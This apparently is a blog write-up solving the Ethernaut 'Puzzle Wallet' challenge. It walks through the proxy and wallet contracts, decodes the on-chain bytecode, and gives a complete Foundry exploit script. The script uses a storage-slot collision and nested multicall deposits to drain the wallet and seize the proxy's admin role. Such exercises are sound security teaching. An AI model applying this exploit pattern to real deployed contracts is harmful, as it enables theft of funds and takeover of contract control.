---
layout: post
title: "[Ethernaut] 24.Puzzle Wallet"
tags: blockchain ethernaut foundry etherscan EIP-1967 metadata proxy delegatecall
---

# Analysis

---

The goal is “hijack this wallet to become the admin of the proxy”.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../helpers/UpgradeableProxy-08.sol";

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData)
        UpgradeableProxy(_implementation, _initData)
    {
        admin = _admin;
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "Caller is not the admin");
        _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted() {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
        require(address(this).balance == 0, "Contract balance is not 0");
        maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
        require(address(this).balance <= maxBalance, "Max balance reached");
        balances[msg.sender] += msg.value;
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success,) = to.call{value: value}(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success,) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}
```

When searching for the given instance address on Etherscan,

![Image etherscan]({{site.url}}/images/2026-01-09-Puzzle_Wallet/etherscan.png)

we can obtain the following result, and when looking at the instance address '**0x3B4dF0D5...c938Bfcf7**',

```solidity
0x608060405234801561001057600080fd5b5060405161080238038061080283398101604081905261002f91610229565b818161005c60017f360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbd6102f9565b6000805160206107e2833981519152146100785761007861031e565b6100818261011d565b8051156100f2576000826001600160a01b0316826040516100a29190610334565b600060405180830381855af49150503d80600081146100dd576040519150601f19603f3d011682016040523d82523d6000602084013e6100e2565b606091505b50509050806100f057600080fd5b505b5050600180546001600160a01b0319166001600160a01b039490941693909317909255506103509050565b610130816101b860201b6103091760201c565b6101a65760405162461bcd60e51b815260206004820152603660248201527f5570677261646561626c6550726f78793a206e657720696d706c656d656e746160448201527f74696f6e206973206e6f74206120636f6e747261637400000000000000000000606482015260840160405180910390fd5b6000805160206107e283398151915255565b6001600160a01b03163b151590565b80516001600160a01b03811681146101de57600080fd5b919050565b634e487b7160e01b600052604160045260246000fd5b60005b838110156102145781810151838201526020016101fc565b83811115610223576000848401525b50505050565b60008060006060848603121561023e57600080fd5b610247846101c7565b9250610255602085016101c7565b60408501519092506001600160401b038082111561027257600080fd5b818601915086601f83011261028657600080fd5b815181811115610298576102986101e3565b604051601f8201601f19908116603f011681019083821181831017156102c0576102c06101e3565b816040528281528960208487010111156102d957600080fd5b6102ea8360208301602088016101f9565b80955050505050509250925092565b60008282101561031957634e487b7160e01b600052601160045260246000fd5b500390565b634e487b7160e01b600052600160045260246000fd5b600082516103468184602087016101f9565b9190910192915050565b6104838061035f6000396000f3fe60806040526004361061005e5760003560e01c8063a02fcc0a11610043578063a02fcc0a146100d1578063a6376746146100f1578063f851a4401461013b5761006d565b806326782247146100755780633659cfe6146100b15761006d565b3661006d5761006b61015b565b005b61006b61015b565b34801561008157600080fd5b50600054610095906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b3480156100bd57600080fd5b5061006b6100cc36600461041d565b61018d565b3480156100dd57600080fd5b5061006b6100ec36600461041d565b6101f8565b3480156100fd57600080fd5b5061006b61010c36600461041d565b6000805473ffffffffffffffffffffffffffffffffffffffff19166001600160a01b0392909216919091179055565b34801561014757600080fd5b50600154610095906001600160a01b031681565b61018b6101867f360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc5490565b610318565b565b6001546001600160a01b031633146101ec5760405162461bcd60e51b815260206004820152601760248201527f43616c6c6572206973206e6f74207468652061646d696e00000000000000000060448201526064015b60405180910390fd5b6101f58161033c565b50565b6001546001600160a01b031633146102525760405162461bcd60e51b815260206004820152601760248201527f43616c6c6572206973206e6f74207468652061646d696e00000000000000000060448201526064016101e3565b6000546001600160a01b038281169116146102d7576040805162461bcd60e51b81526020600482015260248101919091527f4578706563746564206e65772061646d696e206279207468652063757272656e60448201527f742061646d696e206973206e6f74207468652070656e64696e672061646d696e60648201526084016101e3565b506000546001805473ffffffffffffffffffffffffffffffffffffffff19166001600160a01b03909216919091179055565b6001600160a01b03163b151590565b3660008037600080366000845af43d6000803e808015610337573d6000f35b3d6000fd5b6103458161037c565b6040516001600160a01b038216907fbc7cd75a20ee27fd9adebab32041f755214dbc6bffa90cc0225b39da2e5c2d3b90600090a250565b6001600160a01b0381163b6103f95760405162461bcd60e51b815260206004820152603660248201527f5570677261646561626c6550726f78793a206e657720696d706c656d656e746160448201527f74696f6e206973206e6f74206120636f6e74726163740000000000000000000060648201526084016101e3565b7f360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc55565b60006020828403121561042f57600080fd5b81356001600160a01b038116811461044657600080fd5b939250505056fea264697066735822122019f5b597827a464b3dc9c8297579a2f42ecc3c05c39a711bc728b4426bdb12c264736f6c634300080c0033360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc000000000000000000000000725595ba16e76ed1f6cc1e1b65a88365cc494824000000000000000000000000cbe7d493e8aa233cd2af845c158beab5fa723b8400000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000024b7b0422d0000000000000000000000000000000000000000000000056bc75e2d6310000000000000000000000000000000000000000000000000000000000000
```

We can observe that the Implementation Slot address defined in the EIP-1967 standard, `bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1)` ⇒ `360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc`, follows `736f6c634300080c0033`, which [represents the `solc` version and metadata length](https://docs.soliditylang.org/en/latest/metadata.html). Afterward, you can confirm that the constructor arguments follow.

```solidity
$ cast decode-abi --input "constructor(address,address,bytes)()" 0x000000000000000000000000725595ba16e76ed1f6cc1e1b65a88365cc494824000000000000000000000000cbe7d493e8aa233cd2af845c158beab5fa723b8400000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000024b7b0422d0000000000000000000000000000000000000000000000056bc75e2d6310000000000000000000000000000000000000000000000000000000000000
0x725595BA16E76ED1F6cC1e1b65A88365cC494824
0xCbE7D493E8aa233Cd2AF845C158bEab5fA723B84
0xb7b0422d0000000000000000000000000000000000000000000000056bc75e2d63100000
```

When directly inspecting the storage of the PuzzleProxy contract, we can see that the `admin` value set in the `constructor` is `0x725595BA16E76ED1F6cC1e1b65A88365cC494824`(Level address).

```solidity
$ cast storage 0x3b4df0d50d91dce6995d60869e9b886c938bfcf7 1 --rpc-url sepoli
a
0x000000000000000000000000725595ba16e76ed1f6cc1e1b65a88365cc494824
```

Thus, we confirmed that the code of the given instance address is the PuzzleProxy contract.

**The key features of the PuzzleProxy contract:**

- The `proposeNewAdmin()` function changes `pendingAdmin`.
- The `approveNewAdmin()` function changes `admin` (when `onlyAdmin`).

**The key features of the PuzzleWallet contract:**

- The `setMaxBalance()` function changes `maxBalance` (when `onlyWhitelisted`).
- The `addToWhitelist()` function changes `whitelisted[addr]` to `true`.
- The `deposit()` function adds `msg.value` to `balances[msg.sender]` (when `onlyWhitelisted`).
- The `execute()` function performs a call (when `onlyWhitelisted`).
- The `multicall()` function performs multiple calls, excluding `deposit()` (when `onlyWhitelisted`).

### UpgradeableProxy-08

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/proxy/Proxy.sol";
import "openzeppelin-contracts-08/utils/Address.sol";

/**
 *
 * @dev This contract implements an upgradeable proxy. It is upgradeable because calls are delegated to an
 * implementation address that can be changed. This address is stored in storage in the location specified by
 * https://eips.ethereum.org/EIPS/eip-1967[EIP1967], so that it doesn't conflict with the storage layout of the
 * implementation behind the proxy.
 *
 * Upgradeability is only provided internally through {_upgradeTo}. For an externally upgradeable proxy see
 * {TransparentUpgradeableProxy}.
 */
contract UpgradeableProxy is Proxy {
    /**
     * @dev Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
     *
     * If `_data` is nonempty, it's used as data in a delegate call to `_logic`. This will typically be an encoded
     * function call, and allows initializating the storage of the proxy like a Solidity constructor.
     */
    constructor(address _logic, bytes memory _data) {
        assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1));
        _setImplementation(_logic);
        if (_data.length > 0) {
            // solhint-disable-next-line avoid-low-level-calls
            (bool success,) = _logic.delegatecall(_data);
            require(success);
        }
    }

    /**
     * @dev Emitted when the implementation is upgraded.
     */
    event Upgraded(address indexed implementation);

    /**
     * @dev Storage slot with the address of the current implementation.
     * This is the keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1, and is
     * validated in the constructor.
     */
    bytes32 private constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    /**
     * @dev Returns the current implementation address.
     */
    function _implementation() internal view override returns (address impl) {
        bytes32 slot = _IMPLEMENTATION_SLOT;
        // solhint-disable-next-line no-inline-assembly
        assembly {
            impl := sload(slot)
        }
    }

    /**
     * @dev Upgrades the proxy to a new implementation.
     *
     * Emits an {Upgraded} event.
     */
    function _upgradeTo(address newImplementation) internal {
        _setImplementation(newImplementation);
        emit Upgraded(newImplementation);
    }

    /**
     * @dev Stores a new address in the EIP1967 implementation slot.
     */
    function _setImplementation(address newImplementation) private {
        require(Address.isContract(newImplementation), "UpgradeableProxy: new implementation is not a contract");

        bytes32 slot = _IMPLEMENTATION_SLOT;

        // solhint-disable-next-line no-inline-assembly
        assembly {
            sstore(slot, newImplementation)
        }
    }
}
```

In the inherited UpgradeableProxy contract, you can see that the `_setImplementation` function stores `_logic` in the `_IMPLEMENTATION_SLOT`.

`_logic` is the second argument of the `PuzzleProxy` constructor (`0xCbE7D493E8aa233Cd2AF845C158bEab5fA723B84`), and as seen earlier on Etherscan, this address is identified as the PuzzleWallet address.

### Proxy

```solidity
// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.6.0) (proxy/Proxy.sol)

pragma solidity ^0.8.0;

/**
 * @dev This abstract contract provides a fallback function that delegates all calls to another contract using the EVM
 * instruction `delegatecall`. We refer to the second contract as the _implementation_ behind the proxy, and it has to
 * be specified by overriding the virtual {_implementation} function.
 *
 * Additionally, delegation to the implementation can be triggered manually through the {_fallback} function, or to a
 * different contract through the {_delegate} function.
 *
 * The success and return data of the delegated call will be returned back to the caller of the proxy.
 */
abstract contract Proxy {
    /**
     * @dev Delegates the current call to `implementation`.
     *
     * This function does not return to its internal call site, it will return directly to the external caller.
     */
    function _delegate(address implementation) internal virtual {
        assembly {
            // Copy msg.data. We take full control of memory in this inline assembly
            // block because it will not return to Solidity code. We overwrite the
            // Solidity scratch pad at memory position 0.
            calldatacopy(0, 0, calldatasize())

            // Call the implementation.
            // out and outsize are 0 because we don't know the size yet.
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)

            // Copy the returned data.
            returndatacopy(0, 0, returndatasize())

            switch result
            // delegatecall returns 0 on error.
            case 0 {
                revert(0, returndatasize())
            }
            default {
                return(0, returndatasize())
            }
        }
    }

    /**
     * @dev This is a virtual function that should be overridden so it returns the address to which the fallback function
     * and {_fallback} should delegate.
     */
    function _implementation() internal view virtual returns (address);

    /**
     * @dev Delegates the current call to the address returned by `_implementation()`.
     *
     * This function does not return to its internal call site, it will return directly to the external caller.
     */
    function _fallback() internal virtual {
        _beforeFallback();
        _delegate(_implementation());
    }

    /**
     * @dev Fallback function that delegates calls to the address returned by `_implementation()`. Will run if no other
     * function in the contract matches the call data.
     */
    fallback() external payable virtual {
        _fallback();
    }

    /**
     * @dev Fallback function that delegates calls to the address returned by `_implementation()`. Will run if call data
     * is empty.
     */
    receive() external payable virtual {
        _fallback();
    }

    /**
     * @dev Hook that is called before falling back to the implementation. Can happen as part of a manual `_fallback`
     * call, or as part of the Solidity `fallback` or `receive` functions.
     *
     * If overridden should call `super._beforeFallback()`.
     */
    function _beforeFallback() internal virtual {}
}

```

In the inherited Proxy contract, we can see a Proxy structure where the `delegatecall()` function is executed within the `fallback()` function.

# Exploit

---

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/PuzzleWallet.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract PuzzleWalletSol is Script {
    PuzzleProxy public pp_ = PuzzleProxy(payable(0x3B4dF0D50D91Dce6995d60869e9b886c938Bfcf7));
    PuzzleWallet public pw_ = PuzzleWallet(payable(0x3B4dF0D50D91Dce6995d60869e9b886c938Bfcf7));

    function run() external {
        vm.startBroadcast();

        console.log("Before pendingAdmin:   ", pp_.pendingAdmin());
        console.log("Before owner:          ", pw_.owner());
        pp_.proposeNewAdmin(msg.sender);
        console.log("Exected proposeNewAdmin");
        console.log("After  pendingAdmin:   ", pp_.pendingAdmin());
        console.log("After  owner:          ", pw_.owner());
        
        console.log("====================");
        console.log("Before whitelisted:    ", pw_.whitelisted(msg.sender));
        pw_.addToWhitelist(msg.sender);
        console.log("Exected addToWhitelist");
        console.log("After  whitelisted:    ", pw_.whitelisted(msg.sender));

        console.log("====================");
        console.log("Before balance:       ", address(pw_).balance);
        console.log("Before user balance:  ", pw_.balances(msg.sender));
        pw_.deposit{value: 0.001 ether}();
        console.log("Exected deposit");
        console.log("After balance:        ", address(pw_).balance);
        console.log("After user balance:   ", pw_.balances(msg.sender));

        console.log("====================");
        bytes[] memory data0 = new bytes[](1);
        data0[0] = abi.encodeWithSignature("deposit()");

        bytes[] memory data = new bytes[](2);
        data[0] = abi.encodeWithSignature("deposit()");
        data[1] = abi.encodeWithSignature("multicall(bytes[])", data0);
        pw_.multicall{value: 0.001 ether}(data);
        console.log("Exected multicall deposit x2");
        console.log("After balance:        ", address(pw_).balance);
        console.log("After user balance:   ", pw_.balances(msg.sender));

        console.log("====================");
        pw_.execute(msg.sender, 0.003 ether, "");
        console.log("Exected execute to withdraw all");
        console.log("After balance:        ", address(pw_).balance);
        console.log("After user balance:   ", pw_.balances(msg.sender));

        console.log("====================");
        console.log("Before maxBalance:    ", address(uint160(pw_.maxBalance())));
        console.log("Before admin:         ", pp_.admin());
        pw_.setMaxBalance(uint256(uint160(msg.sender)));
        console.log("Exected setMaxBalance");
        console.log("After  maxBalance:    ", address(uint160(pw_.maxBalance())));
        console.log("After  admin:         ", pp_.admin());

        vm.stopBroadcast();
    }
}
```

For convenience, they are distinguished as `pp_` and `pw_`.

Since the PuzzleWallet contract is called by the PuzzleProxy via `delegatecall()`, their storage is shared.
Therefore, calling `proposeNewAdmin(msg.sender)` updates `pendingAdmin` to `msg.sender`; however, since `owner` occupies the same slot 0, it also changes to `msg.sender`.
Subsequently, you can call `addToWhitelist(msg.sender)`, enabling you to pass the `onlyWhitelisted` modifier.

`multicall()` has a vulnerability: although it is designed to allow `deposit()` to be called only once, it is possible to call `deposit()` multiple times by invoking a `multicall()` that executes `deposit()`.
This allows `deposit()` to be executed multiple times with a single Ether transfer, thereby manipulating `balances[msg.sender]`.

By calling `deposit()` multiple times to align `address(this).balance` with `balances[msg.sender]`, and then invoking `execute()`, the condition `address(this).balance == 0` can be satisfied, allowing the `setMaxBalance()` function to be called.
The `setMaxBalance()` function updates `maxBalance`; since `admin` shares slot 1, its value is also modified, thereby achieving the goal.

The primary vulnerability lay in compromising integrity by invoking `deposit()` multiple times within `multicall()`. If the public variables `pendingAdmin` and `admin` had been stored in Implementation Slots, this goal would not have been achievable.